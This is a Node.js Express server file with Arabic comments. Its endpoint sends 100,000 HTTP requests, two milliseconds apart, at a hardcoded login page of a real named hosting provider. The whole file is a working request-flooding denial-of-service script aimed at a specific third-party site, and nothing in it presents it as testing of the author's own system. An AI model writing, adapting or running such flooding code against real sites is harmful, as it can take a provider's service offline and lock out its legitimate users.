const express = require("express");
const fetch = require("node-fetch"); // تأكد من تثبيت الحزمة `node-fetch`

const app = express();
const port = 3000;

// الدالة لإرسال الطلبات
const sendRequests = async (url, times, interval) => {
  for (let i = 0; i < times; i++) {
    fetch(url)
      .then((response) => {
        console.log(`Request ${i + 1}:`, response.status);
      })
      .catch((error) => {
        console.error(`Request ${i + 1} failed:`, error.message);
      });

    // الانتظار بين الطلبات
    await new Promise((resolve) => setTimeout(resolve, interval));
  }
};

// إعداد واجهة API لاستدعاء الدالة
app.post("/send-requests", async (req, res) => {
  const targetUrl =
    "https://my.libyanspider.com/index.php?rp=%2Flogin&language=english"; // الرابط الهدف
  const totalRequests = 100000; // عدد الطلبات (يمكن تغييره عبر `req.body` إذا أردت)
  const requestInterval = 2; // الفاصل الزمني بين الطلبات (بالملي ثانية)

  try {
    console.log(`Starting requests to ${targetUrl}`);
    await sendRequests(targetUrl, totalRequests, requestInterval);
    res.status(200).send("Requests sent successfully!");
  } catch (error) {
    console.error("Error in sending requests:", error.message);
    res.status(500).send("Error in sending requests.");
  }
});

// بدء الخادم
app.listen(port, () => {
  console.log(`Server is running on http://localhost:${port}`);
});
